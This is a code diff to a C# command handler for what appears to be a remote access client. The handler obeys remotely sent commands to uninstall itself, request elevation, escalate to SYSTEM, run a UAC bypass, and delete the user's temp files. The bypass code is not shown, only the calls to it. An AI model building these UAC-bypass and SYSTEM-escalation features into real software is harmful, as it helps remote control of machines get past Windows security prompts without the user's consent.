@@ -24,7 +24,6 @@ namespace Pulsar.Client.Messages
     public class ClientServicesHandler : IMessageProcessor
     {
         private readonly PulsarClient _client;
-
         private readonly PulsarApplication _application;
 
         public ClientServicesHandler(PulsarApplication application, PulsarClient client)
@@ -33,19 +32,17 @@ namespace Pulsar.Client.Messages
             _client = client;
         }
 
-        /// <inheritdoc />
         public bool CanExecute(IMessage message) => message is DoClientUninstall ||
-                                                             message is DoClientDisconnect ||
-                                                             message is DoClientReconnect ||
-                                                             message is DoAskElevate ||
-                                                             message is DoElevateSystem ||
-                                                             message is DoDeElevate ||
-                                                             message is DoUACBypass;
+                                                     message is DoClientDisconnect ||
+                                                     message is DoClientReconnect ||
+                                                     message is DoAskElevate ||
+                                                     message is DoElevateSystem ||
+                                                     message is DoDeElevate ||
+                                                     message is DoUACBypass ||
+                                                     message is DoClearTempDirectory;
 
-        /// <inheritdoc />
         public bool CanExecuteFrom(ISender sender) => true;
 
-        /// <inheritdoc />
         public void Execute(ISender sender, IMessage message)
         {
             switch (message)
@@ -71,16 +68,19 @@ namespace Pulsar.Client.Messages
                 case DoUACBypass msg:
                     Execute(sender, msg);
                     break;
+                case DoClearTempDirectory msg:
+                    Execute(sender, msg);
+                    break;
             }
         }
 
         private void Execute(ISender client, DoClientUninstall message)
         {
-            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
+            client.Send(new SetStatus { Message = "Starting uninstall process..." });
             try
             {
                 new ClientUninstaller().Uninstall();
-
+                client.Send(new SetStatus { Message = "Uninstallation complete. Exiting client." });
                 _client.Exit();
             }
             catch (Exception ex)
@@ -91,19 +91,25 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, DoClientDisconnect message)
         {
+            client.Send(new SetStatus { Message = "Disconnecting client..." });
             _client.Exit();
         }
 
         private void Execute(ISender client, DoClientReconnect message)
         {
+            client.Send(new SetStatus { Message = "Reconnecting client..." });
             _client.Disconnect();
         }
 
         private void Execute(ISender client, DoAskElevate message)
         {
             var userAccount = new UserAccount();
+            client.Send(new SetStatus { Message = "Checking for administrative privileges..." });
+
             if (userAccount.Type != AccountType.Admin)
             {
+                client.Send(new SetStatus { Message = "Attempting to request elevation..." });
+
                 ProcessStartInfo processStartInfo = new ProcessStartInfo
                 {
                     FileName = "cmd",
@@ -113,42 +119,86 @@ namespace Pulsar.Client.Messages
                     UseShellExecute = true
                 };
 
-                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
+                _application.ApplicationMutex.Dispose();
                 try
                 {
                     Process.Start(processStartInfo);
+                    client.Send(new SetStatus { Message = "Elevation process started. Exiting current instance." });
                 }
                 catch
                 {
-                    client.Send(new SetStatus {Message = "User refused the elevation request."});
-                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
+                    client.Send(new SetStatus { Message = "User refused the elevation request." });
+                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
                     return;
                 }
                 _client.Exit();
             }
             else
             {
-                client.Send(new SetStatus { Message = "Process already elevated." });
+                client.Send(new SetStatus { Message = "Process already running with administrative privileges." });
             }
         }
 
         private void Execute(ISender client, DoElevateSystem message)
         {
-            //check if currently running as system. If not, use SystemElevation.Start() to elevate
+            client.Send(new SetStatus { Message = "Attempting to elevate to SYSTEM..." });
             SystemElevation.Elevate(client);
         }
 
         private void Execute(ISender client, DoDeElevate message)
         {
-            //check if currently running as system. If so, use SystemElevation.Stop() to de-elevate
+            client.Send(new SetStatus { Message = "Attempting to de-elevate from SYSTEM..." });
             SystemElevation.DeElevate(client);
         }
 
         private void Execute(ISender client, DoUACBypass message)
         {
+            client.Send(new SetStatus { Message = "Executing UAC bypass..." });
             Bypass.DoUacBypass();
-
+            client.Send(new SetStatus { Message = "UAC bypass completed. Exiting client." });
             _client.Exit();
+        }
+
+        private void Execute(ISender client, DoClearTempDirectory message)
+        {
+            client.Send(new SetStatus { Message = "Starting temporary file cleanup..." });
+            try
+            {
+                string tempPath = System.IO.Path.GetTempPath();
+                string[] files = System.IO.Directory.GetFiles(tempPath, "*", System.IO.SearchOption.AllDirectories);
+                int deletedFiles = 0;
+
+                foreach (string file in files)
+                {
+                    try
+                    {
+                        System.IO.File.Delete(file);
+                        deletedFiles++;
+                    }
+                    catch
+                    {
+                        // Ignore permission or lock errors
+                    }
+                }
+
+                foreach (string dir in System.IO.Directory.GetDirectories(tempPath))
+                {
+                    try
+                    {
+                        System.IO.Directory.Delete(dir, true);
+                    }
+                    catch
+                    {
+                        // Ignore restricted directories
+                    }
+                }
+
+                client.Send(new SetStatus { Message = $"Cleanup complete — {deletedFiles} files deleted." });
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Temp cleanup failed: {ex.Message}" });
+            }
         }
     }
 }
